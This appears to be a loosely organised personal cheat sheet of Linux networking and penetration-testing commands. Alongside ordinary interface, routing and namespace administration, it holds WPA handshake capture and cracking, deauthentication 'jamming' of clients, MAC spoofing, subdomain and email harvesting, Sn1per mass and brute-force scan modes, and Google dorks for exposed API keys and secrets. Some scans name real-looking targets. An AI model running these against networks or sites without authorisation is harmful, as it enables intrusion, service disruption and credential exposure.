    iw wlan0 scan dump -u				## Dump the current scan results
##-====================================================================================-##
    iw wlan0 survey dump			    ## List all gathered channel survey data
##-====================================================================================-##
    iw wlan0 station dump				## List all stations known, AP on interfaces
##-====================================================================================-##
    iw wlan0 station get <MAC address>	## Get information for a specific station.
##-====================================================================================-##
    iw wlan0 event						## Monitor events from the kernel
##-====================================================================================-##



iwconfig wlan0 nwid off         ## Disable The Network ID Checking (NWID promiscuous)


nmcli radio all off
iw reg set US
iwconfig wlan1 txpower 25

nmcli device show
nmcli device status
nmcli general status
nmcli -t device
nmcli connection show
nmcli dev status STATE
nmcli dev status CONNECTION

nmcli device wifi list
nmcli device wifi list bssid

nmcli connection show
nmcli connection show Ethernet\ connection\ 1
nmcli -f GENERAL,WIFI-PROPERTIES dev show eth0 


pkaction --action-id org.freedesktop.NetworkManager.network-control --verbose

nmcli -p -f general,wifi-properties device show
nmcli connection edit type ethernet
nmcli> set connection.autoconnect no
nmcli -t -c auto radio wwan off


ethtool eth0
ethtool -S eth0                     ## Statistics
ethtool ‐s eth0 autoneg off


ip link show
ip addr show
ip neigh show
ip ntable show
ip route showdump
ip netconf show
ip netns list
ip netns add NAME
ip netns set NAME NETNSID

traceroute 
cat /proc/net/dev | columns -t 
awk '{ print $1,$5 }' /proc/net/dev
ifpps --dev eth0

wavemon -g                  ## Fix screen dimensions
wavemon -i wlan0            ## Use specified network interface

route ‐n
netstat ‐rn

route add ‐net 192.168.20.0 netmask 255.255.255.0 gw 192.168.16.254
ip route add 192.168.20.0/24 via 192.168.16.254
route add ‐net 192.168.20.0 netmask 255.255.255.0 dev eth0
route add default gw 192.168.51.254
ip route add default via 192.168.51.254 dev eth0


ifconfig eth0 hw ether




##-===========================================================================-##
##          [+] Link types:
##-===========================================================================-##
## --> 		vlan - 802.1q tagged virtual LAN interface
## --> 		veth - Virtual ethernet interface
## --> 		vcan - Virtual Local CAN interface
## --> 		dummy - Dummy network interface
## --> 		ifb - Intermediate Functional Block device
## --> 		macvlan - virtual interface base on link layer address (MAC)
## --> 		can - Controller Area Network interface
## --> 		bridge - Ethernet Bridge device
##-===========================================================================-##



##-==============================================-##
##     [+] Create a new vlan device eth0.10 on device eth0
##-==============================================-##
ip link add link eth0 name eth0.10 type vlan id 10


ip link add link eth0 name eth0.7 type vlan id 7

ip link delete dev eth0.7                                   ## Removes vlan device

ip link add link eth0 name eth0.7 type bridge


##-===========================-##
##     [+] Print existing VPN keys:
##-===========================-##
ip xfrm state list                  ## Print existing VPN kejs


##-===========================-##
##     [+] Show 
##-===========================-##
brctl show


ip link set x up				##  Bring up interface 
ip link set x down			##  Bring down interface 




display current time when using monitor
-timestamp






ip addr show
ip link show


TUN/TAP 

tuntap




tunnel ethernet over IP (L2TPv3)
l2tp







network namespace
switches ip to the specified network namespace

/run/netns/NAME
setns

ip netns list

 - show all of the named network namespaces

ip netns add $Name

 - create a new named network namespace

If NAME is available in /run/netns 
this $Cmd creates a new network namespace and assigns NAME.

ip netns attach $Name $PID
 - create a new named network namespace

ip netns add net0
                 $ ip link set dev eth0 netns net0
                 $ ip netns exec net0 SOME_PROCESS_IN_BACKGROUND
                 $ ip netns del net0

ip netns pids net0 | xargs kill
                 $ ip netns del net0


ip netns add vpn
              Creates a network namespace and names it vpn

       ip netns exec vpn ip link set lo up
              Bring up the loopback interface in the vpn network namespace.

       ip netns add foo
       ip netns add bar
       ip netns set foo 12
       ip netns set bar 13
       ip -n foo netns set foo 22
       ip -n foo netns set bar 23
       ip -n bar netns set foo 32
       ip -n bar netns set bar 33
       ip netns list-id target-nsid 12
              Shows the list of nsids from the network namespace foo.
       ip netns list-id target-nsid 12 nsid 13
              Get nsid of bar from the network namespace foo (result is 23).



















ip netns exec NETNS ip

ip -n[etns] NETNS [ OPTIONS ] OBJECT { COMMAND | 

ip netns exec help

ip netns add NAME
	ip netns attach NAME PID
	ip netns set NAME NETNSID
	ip [-all] netns 

ip netns identify [PID]
	ip netns pids NAME
	ip [-all] netns exec [NAME] cmd ...
	ip netns monitor
	ip netns list-id [target-nsid POSITIVE-INT] [nsid POSITIVE-INT]












##-===========================-##
##     [+] 
##-===========================-##
brctl addbr br0
brctl stp br0 off
brctl addif br0 eth0
brctl addif br0 eth1
ifdown eth0
ifdown eth1
ifconfig ethO:1 $IP $cidr


##-===========================-##
##     [+] 
##-===========================-##
ifconfig eth0 0.0.0.0 up
ifconfig eth1 0.0.0.0 up
ifconfig br0 10.0.3.129 broadcast 10.0.3.255 netmask 255.255.255.0 up 
route add default gw 10.0.3.129
for file in br0 eth0 eth1
do
   echo "1" > /proc/sys/net/ipv4/conf/${file}/proxy_arp
   echo "1" > /proc/sys/net/ipv4/conf/${file}/forwarding
done;
echo "1" > /proc/sys/net/ipv4/ip_forward
brctl delif br0 eth0
brctl delif br0 eth1
ifconfig br0 down
brctl delbr br0


##-===========================-##
##     [+] 
##-===========================-##
#  iface br0 inet static
#       bridge-ifaces eth0 eth1
#       address 192.168.1.1
#       netmask 255.255.255.0
# [ a bridge which acts as an anonymous bridge ]
#  iface br0 inet manual
#       bridge-ifaces eth0 eth1
#       up ifconfig $IFACE up


##-===========================-##
##     [+] 
##-===========================-##
for x in /sys/class/net/"${IFACE}"/brport/*; do
bridge_port='/sys/class/net/"${IFACE}"/brport/*'


##-===========================-##
##     [+] 
##-===========================-##
for x in /sys/class/net/"${IFACE}"/bridge/*; do
is_bridge='/sys/class/net/"${IFACE}"/bridge/*'


##-===========================-##
##     [+] 
##-===========================-##
for x in /sys/class/net/"${IFACE}"/brif/*; do
bridge_IFACE='/sys/class/net/"${IFACE}"/brif/*'



##-===========================-##
##     [+] 
##-===========================-##
ip4list=$(echo $(ip -4 route | awk '{ print $1; }' | sed 's/\/.*$//'))
ip6list=$(echo $(ip -6 route | awk '{ print $1; }' | sed 's/\/.*$//'))


##-===========================-##
##     [+] 
##-===========================-##
iptables ‐L ‐t nat          ## Check NAT Status
iptables ‐L ‐n ‐v
iptables ‐F
iptables ‐X


##-===========================-##
##     [+] 
##-===========================-##
$IPTABLES -P INPUT DROP
$IPTABLES -P OUTPUT DROP
$IPTABLES -P FORWARD DROP


##-===========================-##
##     [+] 
##-===========================-##
cat /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv4/ip_forward

##-===========================-##
##     [+] Disable IPv6 Using /sys/
##-===========================-##
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
echo 1 > /proc/sys/net/ipv6/conf/default/disable_ipv6





- 802.11b provides up to 11 Mb/s per radio in the 2.4 GHz spectrum. (1999)
- 802.11a provides up to 54 Mb/s per radio in the 5 GHz spectrum. (1999)
- 802.11g provides up to 54 Mb/s per radio in the 2.4 GHz spectrum (2003).
- 802.11n provides up to 600 Mb/s per radio in the 2.4 GHz and 5.0 GHz spectrum. (2009)
- 802.11ac provides up to 1000 Mb/s (multi-station) or 500 Mb/s (single-station) in the 5.0 GHz spectrum. (2013?)



 							 Four Way Handshake
						   =======================

		      		Router(AP)                  Client
                   |					             	|  \      Beacons (Here you  
                   |					             	|   }-->  see wireless network 
                   | NOUNCE	(Broadcast)		  |  /      available)
                   |----->----->------>-----|
                   |				            		|
                   |			             			|
                   |				            		|
               /   |Reply of Nounce(unicast)|
              /    |------<-----<------<----|
Clicking on  /     |				            		|
 a wifi     {      |			             			|
Network     {      |		            				|
             \     | Message of Auth.		    |
              \    |---->----->----->-------|
               \   |		(Multicast)       	|
                   |				            		|
                   |			             			|
                   |		            				|
                   |			             			|
                   |Acknowledgment of 		  | ---> KEY + Passphrase
                   |------<-----<------<----|     # here Passphrase is the
                   |Authentication (Unicast)|       password which user 
                   |					             	|       basically inputs
                   |			             			|       and key is something 
                   |					             	|       which gets attached 
                   |				            		|       and is generally 									                                  complex,so in order to 								                                make it user friendly 								                             	 we only have to put 								                              	 Passphrase
                   						




airmon-ng start wlan0
airodump-ng mon0


airodump-ng --channel $Channel --bssid $BSSID --write $File $Interface
airodump-ng --bssid $BSSID -c $ChanNum -w $File mon0

aircrack-ng $File.cap
aircrack-ng -w /usr/share/wordlists/$File.txt $File.cap

aireplay-ng -0 10 -a $RouterBSSID -s $StationBSSID mon0


WiFi Jammer

Deauthenticate All Clients in A Specific network
##  aireplay-ng --deauth [number-of packets] -a [Access-Point] [interface]
aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 mon0
aireplay-ng -0 0 -a $RouterBSSID -s $MAC mon0

Deauthenticate A Specific Client in a network
> aireplay-ng --deauth [number-of packets] -a [Access-Point] -c [target=STATION] [interface]
ex: aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c AA:BB:CC:DD:EE:FF mon0


































macchanger --list | grep Cisco | cut -c9-16
macchanger --list | grep Apple | cut -c9-16
macchanger --list | grep Netgear | cut -c9-16
macchanger --list | grep Linksys | cut -c9-16

ip link set eth0 down
ifconfig eth0 down

ifconfig eth0 down && ifconfig hw ether $macaddr

iwconfig wlan1 txpower 25
iwconfig wlan0 txpower 20
ifconfig eth0 hw ether 00:30:65:e4:98:27
# ifconfig wlan0 hw ether 00:40:96:f4:34:67
ifconfig wlan0 hw ether 00:30:65:39:2e:77
ifconfig wlan1 hw ether 00:30:65:35:2e:37



rfkill block all
rfkill unblock wifi

ip link show wlan0


iw dev wlan0 station dump
iw dev wlan0 scan | less
iwlist wlan0 scanning | egrep "ESSID|Channel"
iwconfig wlan0 mode monitor channel 3
iw scan











##  [+] Creates  A  Virtual  Tunnel  interface  (atX)  
##  [+] For  Sending Arbitrary IP packets 
##  [+] by using Raw ieee802.11 packet injection

airtun-ng -a 00:14:22:56:F3:4E -t 0 -y keystream.xor wlan0








dig ‐x 78.31.70.238
host 78.31.70.238
nslookup 78.31.70.238



dig MX google.com
dig @127.0.0.1 NS sun.com               # To Test the local Server
dig @204.97.212.10 NS MX heise.de       # Query an External Server
dig AXFR @ns1.xname.org cb.vu           # Get The Full Zone (Zone Transfer)

host ‐t MX cb.vu                        ## Get the mail MX Entry
host ‐t NS ‐T sun.com                   ## Get the NS Record over A TCP Connection
host ‐a sleepyowl.net                   ## Get Everything




dig -x $IP
host $IP
host -t SRV service tcp.url.com
dig @ $IP $Domain -t AXrR
host -1 $Domain $Nameserver


# Query Wikipedia Via Console over DNS
dig +short txt <keyword>.wp.dg.cx



 Extract your External IP Address using Dig

 dig +short myip.opendns.com @resolver1.opendns.com


nbtstat -A $IP                          ## Get Hostname For $IP



## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t rvs -i 192.1.1.1,192.1.1.20				## Reverse lookup for IP Range:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t std -d $Domain.com						## Retrieve Standard DNS Records:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t brt -d $Domain.com -w $Hosts.txt	## Enumerate Subdornains:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -d $Domain.com -t axfr						## DNS Zone Transfer:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -d $Host -t zonewalk							## Zone Walking
## --------------------------------------------------------------------------------------------------------------- ##



DNSRecon-Performing-[Host]+[Subdomain]-Brute-Force.txt

dnsrecon.py -d blackline.com -D subdomains-top1mil-20000.txt -t brt --threads 10 -a



## /usr/share/dirbuster/wordlists/directories.jbrofuzz
dnsenum sans.org -f /usr/share/dirbuster/wordlists/directories.jbrofuzz



[*] Performing Host and Subdomain Brute Force Against blackline.com


dig -t axfr @<DNS you are querying> <target>
 
dnsrecon -t rvl -r 192.168.1.0/24
 
dnsrecon -t srv -d example.com


dnsrecon.py -t brt,std,axfr -D /pentest/enumeration/dns/dnsrecon/namelist.txt -d $target > /tmp/$target.dnsrecon.txt.tmp

 | grep -vE 'Trying|TCP|MX|NS|SOA|Has'


theHarvester.py -l 500 -b all -d $target > /tmp/$target.emails.txt

theharvester -d microsoft.com -l 500 -b google
theharvester -d microsoft.com -b pgp
theharvester -d microsoft -l 200 -b linkedin
theharvester -d apple.com -b googleCSE -l 500 -s 300


metagoofil.py -d $target -t doc,xls,docx -l 200 -n 50 -o ~/Desktop/$target/metagoofil.tmp/ -f ~/Desktop/$target/users.html
metagoofil -d $domain -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 20 -n 20  -o ~/Desktop/$domain/metagoofil/ -f ~/Desktop/$domain/users_temp.txt





dnsrecon -t brt,std,axfr -D $dnslist -d $domain > $tmpwdir/$0_dnsrecon.txt

sslscan --ssl2 $domain | grep DNS | sed 's/,/"\n"/g' | sed 's/"//g' | cut -d':' -f2 > ~/Desktop/$domain/sslcertdomains_temp.txt
nmap -vv $domain -script=ssl-cert -p443 | grep commonName | grep -v 'Issuer' | cut -d '/' -f1 | cut -d '=' -f2 >> ~/Desktop/$domain/sslcertdomains_temp.txt


sslscan --verbose --http --sleep=2000 --show-certificate bkuw300ps345672-cs30.serverfarm.evil-corp-usa.com

testssl <url target>





LinEnum.sh -s -k $Keyword -r $ReportName -e /$Dir/ -t 




SSLScrape is a tool that will take a netblock(CIDR) as input, 
queries each IP address for SSL/TLS certificates 
and extracts hostnames from SSL certificates that are returned.

SSLScrape | A scanning tool for scaping hostnames from SSL certificates. - cheetz/sslScrape_github.com](https://github.com/cheetz/sslScrape "https://github.com/cheetz/sslScrape")[](https://github.com/cheetz/sslScrape)

sslScrape.py TARGET_CIDR



whois -h whois.cymru.com $(dig +short $Domain)


bgp.he.net




whois -h whois.arin.net "e @ icann.org" | grep -E -o "\b[a-zA-Z0-9.-]+@[a-zA-Z0–9.-]+\.[a-zA-Z0–9.-]+\b" | uniq


query [RADB WHOIS server]
to return all the netblocks that belong to 
an Autonomous System Number(ASN)

Listing all the netblocks under an ASN 
using a query against RADB WHOIS server


whois -h whois.radb.net -- '-i origin AS111111' | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq



We can query ARIN WHOIS server to return all POC, ASN, organizations, 
and end user customers

whois -h whois.arin.net "z wikimedia"

Finding [Autonomous System (AS) Numbers]
https://www.iana.org/assignments/as-numbers


find ASN for a given IP address
curl -s http://ip-api.com/json/$IP | jq -r .as


We can use WHOIS service or NSE scripts to identify 
all the netblocks that belong to the ASN number.

Finding netblocks that belong to an ASN using targets-asn NSE script
nmap --script targets-asn --script-args targets-asn.asn=$ASN




Open Source Intelligence Gathering 201


[Censys]
https://censys.io

Censys API]
https://censys.io/api

## censys-enumeration" extracting subdomains and email addresses using Censys API
https://github.com/yamakira/censys-enumeration



[Shodan]
http://shodan.io


https://aslookup.com
https://findsubdomains.com
https://spyse.com (fully-fledged recon service)
http://reverseip.domaintools.com/

[Reverse IP Lookup](http://reverseip.domaintools.com/) (Domainmonitor)
- [Security headers](https://securityheaders.io/) (Security Report, missing headers)

http://ipv4info.com/ (Find domains in the IP block owned by a Company/Organization)
- [HackerTarget Tools](https://hackertarget.com/ip-tools/) (DNS recon, site lookup, and scanning tools)
- [VirusTotal](https://virustotal.com/en-gb/domain/google.com/information/) (WHOIS, DNS, and subdomain recon)
- [crt.sh](https://crt.sh/?q=%25.uber.com) (SSL certificate search)
- [Google CT](https://transparencyreport.google.com/https/certificates) (SSL certificate transparency search)
- [PenTest Tools](https://pentest-tools.com/information-gathering/google-hacking) (Google dorks)
- [Wayback Machine](https://archive.org/web/) (Find stuff which was hosted on the domain in past)
- [FindSubdomains](https://findsubdomains.com/) (Find subdomains using domain or keywords)











OPENVAS_HOST="127.0.0.1"
OPENVAS_PORT="9390"

sniper -t 127.0.0.1 -m vulnscan
sniper -f /path/to/file.txt -m massvulnscan


sniper -t $TARGET -m $MODE --noreport $args
-m stealth --noreport --noloot -t $TARGET

RECON
-re


FULLNMAPSCAN
-fp

##-===================-##
##    [*] NORMAL MODE
##-===================-##
sniper -t $Target

##-===================================-##
##    [*] NORMAL MODE + OSINT + RECON
##-===================================-##
sniper -t $Target -o -re

##-===================================-##
##    [*] STEALTH MODE + OSINT + RECON
##-===================================-##
sniper -t $Target -m stealth -o -re

##-=====================-##
##    [*] DISCOVER MODE
##-=====================-##
sniper -t $CIDR -m discover -w $Workspace

##-==============================-##
##    [*] SCAN ONLY SPECIFIC PORT
##-==============================-##
sniper -t $Target -m port -p $Ports

##-==============================-##
##    [*] FULLPORTONLY SCAN MODE
##-==============================-##
sniper -t $Target -fp

##-===================================-##
##    [*] WEB MODE - PORT 80 + 443 ONLY!
##-===================================-##
sniper -t $Target -m web

##-===========================-##
##    [*] HTTP WEB PORT MODE
##-===========================-##
sniper -t $Target -m webporthttp -p $Port

##-===========================-##
##    [*] HTTPS WEB PORT MODE
##-===========================-##
sniper -t $Target -m webporthttps -p $Port

##-===========================-##
##    [*] HTTP WEBSCAN MODE
##-===========================-##
sniper -t $Target -m webscan 

##-===========================-##
##    [*] ENABLE BRUTEFORCE
##-===========================-##
sniper -t $Target -b

##-=====================-##
##    [*] AIRSTRIKE MODE
##-=====================-##
sniper -f $File.txt -m airstrike

##-==================================-##
##    [*] NUKE MODE WITH TARGET LIST
##-==================================-##
## ------------------------------------------------------------- ##
##    [+] BRUTEFORCE ENABLED
##    [+] FULLPORTSCAN ENABLED
##    [+] OSINT ENABLED
##    [+] RECON ENABLED
##    [+] WORKSPACE & LOOT ENABLED
## ------------------------------------------------------------- ##
sniper -f $File.txt -m nuke -w $Workspace

##-===========================-##
##    [*] MASS PORT SCAN MODE
##-===========================-##
sniper -f $File.txt -m massportscan

##-===========================-##
##    [*] MASS WEB SCAN MODE
##-===========================-##
sniper -f $File.txt -m massweb

##-================================-##
##    [*] MASS WEBSCAN SCAN MODE
##-===========================-##
sniper -f $File.txt -m masswebscan

##-===========================-##
##    [*] MASS VULN SCAN MODE
##-===========================-##
sniper -f $File.txt -m massvulnscan

##-======================-##
##    [*] PORT SCAN MODE
##-======================-##
sniper -t $Target -m port -p <PORT_NUM>

##-=======================-##
##    [*] LIST WORKSPACES
##-=======================-##
sniper --list

##-=========================-##
##    [*] DELETE WORKSPACE
##-=========================-##
sniper -w $Workspace -d

##-===================================-##
##    [*] DELETE HOST FROM WORKSPACE
##-===================================-##
sniper -w $Workspace -t $Target -dh

##-=============================-##
##    [*] GET SNIPER SCAN STATUS
##-=============================-##
sniper --status

##-==============================-##
##    [*] LOOT REIMPORT FUNCTION
##-==============================-##
sniper -w $Workspace --reimport

##-=================================-##
##    [*] LOOT REIMPORTALL FUNCTION
##-=================================-##
sniper -w $Workspace --reimportall

##-===============================-##
##    [*] LOOT REIMPORT FUNCTION
##-===============================-##
sniper -w $Workspace --reload

##-=============================-##
##    [*] LOOT EXPORT FUNCTION
##-=============================-##
sniper -w $Workspace --export

##-========================-##
##    [*] SCHEDULED SCANS
##-========================-##
sniper -w $Workspace -s daily|weekly|monthly

##-===========================-##
##    [*] USE A CUSTOM CONFIG
##-===========================-##
sniper -c /$Dir/sniper.conf -t $Target -w $Workspace

##-====================-##
##    [*] UPDATE SNIPER
##-====================-##
sniper --update










WAFW00F - Web Application Firewall Detection Tool
Cross-Site Tracer

Nikto
Xprobe2 

Fragroute  intercepts,  modifies,  and rewrites egress traffic destined  for the specified host.
fragroute -f $location $ip



InUrlBR OSINT Queries
testssl



inurlbr.php --dork "site:$TARGET" -s inurlbr-$TARGET | tee $LOOT_DIR/osint/inurlbr-$TARGET
sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/osint/inurlbr-$TARGET > $LOOT_DIR/osint/inurlbr-$TARGET.txt 


urlcrazy -k $layout -i -o $location $url



## GATHERING DNS SUBDOMAINS VIA SUBLIST3R
sublist3r.py -d $TARGET -vvv -o $LOOT_DIR/domains/domains-$TARGET.txt



Sublist3r One-liner

This runs Sublist3r on a list of domains 
and outputs the results in separate files.

cat domains | xargs -n1 -i{} python sublist3r.py -d {} -o {}.txt


Certspotter

curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq

curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq | dig +short -f - | uniq | nmap -T5 -Pn -sS -i - -p 80,443,21,22,8080,8081,8443 --open -n -oG -


##  GATHERING DNS SUBDOMAINS VIA AMASS
amass enum -ip -o $LOOT_DIR/domains/domains-$TARGET-amass.txt -rf /usr/share/sniper/plugins/massdns/lists/resolvers.txt -d $TARGET
    cut -d" " -f1 $LOOT_DIR/domains/domains-$TARGET-amass.txt 2>/dev/null | grep $TARGET > $LOOT_DIR/domains/domains-$TARGET-amass-sorted.txt
    cut -d" " -f2 $LOOT_DIR/domains/domains-$TARGET-amass.txt 2>/dev/null > $LOOT_DIR/ips/amass-ips-$TARGET.txt
    wc -l $LOOT_DIR/domains/domains-$TARGET-amass-sorted.txt
wc -l $LOOT_DIR/ips/amass-ips-$TARGET.txt


##  GATHERING REVERSE WHOIS DNS SUBDOMAINS VIA AMASS
amass intel -whois -d $TARGET > $LOOT_DIR/domains/domains-$TARGET-reverse-whois.txt

GATHERING DNS SUBDOMAINS VIA SUBFINDER
subfinder -o $LOOT_DIR/domains/domains-$TARGET-subfinder.txt -b -d $TARGET -w $DOMAINS_DEFAULT -t 100 2>/dev/null
 wc -l $LOOT_DIR/domains/domains-$TARGET-subfinder.txt

##-==================================================-##
##     [+] BRUTE FORCING DNS SUBDOMAINS VIA DNSCAN:
##-==================================================-##
dnscan -d $TARGET -w $DOMAINS_QUICK -o $LOOT_DIR/domains/domains-dnscan-$TARGET.txt -i $LOOT_DIR/domains/domains-ips-$TARGET.txt
    cat $LOOT_DIR/domains/domains-dnscan-$TARGET.txt 2>/dev/null | grep $TARGET| awk '{print $3}' | sort -u >> $LOOT_DIR/domains/domains-$TARGET.txt 2> /dev/null
    dos2unix $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
    sed -ie 's/<BR>/\n/g' $LOOT_DIR/domains/domains-$TARGET.txt

##-==========================================-##
##     [+] GATHERING CERTIFICATE SUBDOMAINS:
##-==================================================-##


curl -s https://crt.sh/?q=%25.$TARGET > $LOOT_DIR/domains/domains-$TARGET-presorted.txt
cat $LOOT_DIR/domains/domains-$TARGET-presorted.txt | grep $TARGET | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/BR/\n/g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | grep -v "*" | sort -u > $LOOT_DIR/domains/domains-$TARGET-crt.txt

##-=====================================-##
##     [+] GATHERING SPYSE SUBDOMAINS:
##-=====================================-##
spyse -target $TARGET --subdomains | grep $TARGET > $LOOT_DIR/domains/domains-$TARGET-spyse.txt



##-=====================================-##
##     [+] GATHERING CENSYS SUBDOMAINS:
##-=====================================-##
censys_subdomain_finder.py --censys-api-id $CENSYS_APP_ID --censys-api-secret $CENSYS_API_SECRET $TARGET | egrep "\-" | awk '{print $2}' | egrep -v "Searching|Found" > $LOOT_DIR/domains/domains-$TARGET-censys.txt


##-=====================================-##
##     [+] GATHERING SHODAN SUBDOMAINS:
##-=====================================-##



shodan init $SHODAN_API_KEY
shodan search "hostname:*.$TARGET" > $LOOT_DIR/domains/shodan-$TARGET.txt 2> /dev/null 
awk '{print $3}' $LOOT_DIR/domains/shodan-$TARGET.txt 2> /dev/null | grep -v "\;" > $LOOT_DIR/domains/domains-$TARGET-shodan-sorted.txt 2> /dev/null
awk '{print $1}' $LOOT_DIR/domains/shodan-$TARGET.txt 2> /dev/null >> $LOOT_DIR/ips/ips-all-unsorted.txt 2>/dev/null
wc -l $LOOT_DIR/domains/domains-$TARGET-shodan-sorted.txt 2> /dev/null
wc -l $LOOT_DIR/ips/ips-all-unsorted.txt


##-==============================================-##
##     [+] GATHERING PROJECT SONAR SUBDOMAINS:
##-=====================================-##



curl -fsSL "https://dns.bufferover.run/dns?q=.$TARGET" | sed 's/\"//g' | cut -f2 -d "," | grep -v "<BR>" | sort -u | grep $TARGET > $LOOT_DIR/domains/domains-$TARGET-projectsonar.txt 2> /dev/null
wc -l $LOOT_DIR/domains/domains-$TARGET-projectsonar.txt



##-=====================================-##
##     [+] GATHERING GITHUB SUBDOMAINS:
##-=====================================-##
github-subdomains.py -t $GITHUB_API_TOKEN -d $TARGET $LOOT_DIR/domains/domains-$TARGET-github.txt


##-========================================-##
##    [+] GATHERING RAPID DNS SUBDOMAINS:
##-========================================-##
curl -s "https://rapiddns.io/subdomain/$TARGET?full=1&down=1#exportData()" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u | grep "$TARGET" | cut -d\/ -f3 2> /dev/null > $LOOT_DIR/domains/domains-$TARGET-rapiddns.txt 2> /dev/null



##-========================================-##
##    [+] 
##-========================================-##
dnsrecon -g -v --threads 2 --lifetime 4 -d $Domain









##-===============================-##
##    [+] Fingerprint Domain/Website:
##-===============================-##


##-========================================-##
##    [+] Extended Network Information:
##-========================================-##


##-=================-##
##    [+] Central Ops:
##-=================-##
https://centralops.net/co/DomainDossier.aspx 

##-==============-##
##    [+] Robtex:
##-==============-##
https://www.robtex.net/




Censys:

https://www.censys.io/


Zoomeye:

https://www.zoomeye.org


Netcraft:
##-=====================================-##


https://www.netcraft.com/


DNS Enumeration / Information:
##-=====================================-##




DNSdumpster:

find DNS servers
MX records about arget domain

https://dnsdumpster.com/ 


the world biggest directory 
of online surveillance security cameras:

http://www.insecam.org


global network of live cameras providing live streaming video

http://www.earthcam.com


http://domaintools.com
http://Viewdns.info
http://whoxy.com
http://centralops.net


projectdiscovery/httpx





https://searchdns.netcraft.com


see the IP address on a map and shows the ISP:

https://ipintel.io/



DNS and e-mail analysis tools:

https://www.dnsstuff.com/tools


detailed DNS information
DNS lookups
MX lookups
WHOIS lookups
Sender Policy Framework (SPF) Lookups
DNS propagation
authoritative name server of the target domain name

https://mxtoolbox.com




















ext:PDF
	s3 site:amazonaws.com
ext:pdf
ext:(doc | pdf | xls| psw | ppt | pps | xml | txt | ps | rtf | odt | sxw )

ext:(doc | pdf | xls | txt |) (intext:confidential
ext:txt | ext:log | ext:cfg

"putty.log" ext:log | ext:cfg | ext:txt | ext:sql | ext:env

intitle:"index of" intext:"apikey.txt
intext:APIKey
-github -stackoverflow intitle:"index of" 
ext:(doc | pdf | xls| txt | xml | odt | html) 
ext:(doc | pdf | xls| txt | xml | odt | html) intext:APIKey
ext:(doc | pdf | xls| txt | xml | odt | html) allintext:"APIKey"
ext:(doc|pdf|xls|txt|xml|odt|html) allintext:"APIKey"
ext:doc | ext:pdf | ext:xls | ext:txt | ext:xml | ext:odt allintext:"APIKey"
ext:doc | ext:pdf | ext:xls | ext:txt | ext:xml | ext:odt
ext:doc | ext:pdf | ext:xls | ext:txt | ext:xml | ext:odt

filetype:key
inurl:asp


 stevenswafford-Google-Dorks.txt
[stevenswafford]-Google-Dorks-EDU.txt


-Google-Dork-List.txt
Jessematic-Google-Dork-List.txt
Google-Dork-List 


 | ext: | ext: | ext:


ext:txt OR ext:xml 

site:ftp.*.*.* "ComputerName=" + "[Unattended] UnattendMode"

"cookies.txt"

allintext:"API_SECRET*" ext:env | ext:yml
ext:log intext:NetworkManager "systemd"

site:ftp://ftp.*.* ext:





Generating stronger DH parameters for nginx's SSL

set as ssl_dhparam in nginx.conf
openssl dhparam -out /etc/nginx/ssl/dhparam.pem 4096




-Making Tor Hidden Services Slightly More Secure 


https://gist.github.com/ageis

[ageis]-.gitconfig

https://gist.github.com/ageis/fec61712de979f3e1513a5e903804445/raw/f0920403d9f1dde85f5214d4e4688e4b9f8d696b/.gitconfig






unicornscan


unicornscan -r200 -Iv -eosdetect  -mT 198.71.232.3:3306,80,443

unicornscan -mU -r200 -I  198.71.232.3

unicornscan -r500 -mT 198.71.232.1/24:80,443,445,339

unicornscan -r200 -Iv -eosdetect -mT vyxunbnbs.com:3306,80,443

unicornscan -eosdetect -Iv -v vyxunbnbs.com

unicornscan -r200 -Iv -eosdetect  -mT vyxunbnbs.com:3306,80,443

unicornscan -r200 -Iv -eosdetect  -mT 198.71.232.3:3306,80,443

unicornscan -msf -v -I 198.71.232.3/24 

unicornscan -mU -v -I 198.71.232.3/24





wapiti http://www.vyxunbnbs.com/ -n 10 -b folder -u -v 1 -f html -o /tmp/scan_report

BlindElephant.py www.vyxunbnbs.com movabletype





























































##-========================================-##
##    [+] DNSdumpster:
##-=====================================-##
dnsdumpster.com


https://censys.io/domain?q=mullvad.net


##  mullvad.net:
##-=====================================-##



https://crt.sh/?q=db96a4558c4a452d3c0ef7cccff6f4bb9f41592f9ec531179db6ab7201db7ce3
https://crt.sh/?asn1=4271715483

https://crt.sh/?id=4271715483&opt=ocsp
curl -s https://crt.sh/?q=%25.$Domain


curl -fsSL "https://crt.sh/?q=%25.$Domain&exclude=expired" | grep $Domain | sort -n | uniq -c | sort -rn | column -t | cut -c 5- > domains.txt


get_certs_domains() {
	curl -s https://crt.sh\?q\=%25.$1 | awk -v pattern="<TD>.*$1" '$0 ~ pattern {gsub("<[^>]*>","");gsub(//,""); print}' | sort -u
}

get_certs() {
	curl -s https://crt.sh\?q\=%25.$1 | awk '/\?id=[0-9]*/{nr[NR]; nr[NR+1]; nr[NR+3]; nr[NR+4]}; NR in nr' | sed 's/<TD style="text-align:center"><A href="?id=//g' | sed 's#">[0-9]*</A></TD>##g' | sed 's#<TD style="text-align:center">##g' | sed 's#</TD>##g' | sed 's#<TD>##g' | sed 's#<A style=["a-z: ?=0-9-"]*>##g' | sed 's#</A>##g' | sed 'N;N;N;s/\n/\t\t/g'
}

get_certs_to_csv() {
	echo 'ID,Logged At,Identity,Issuer Name' > $1.csv
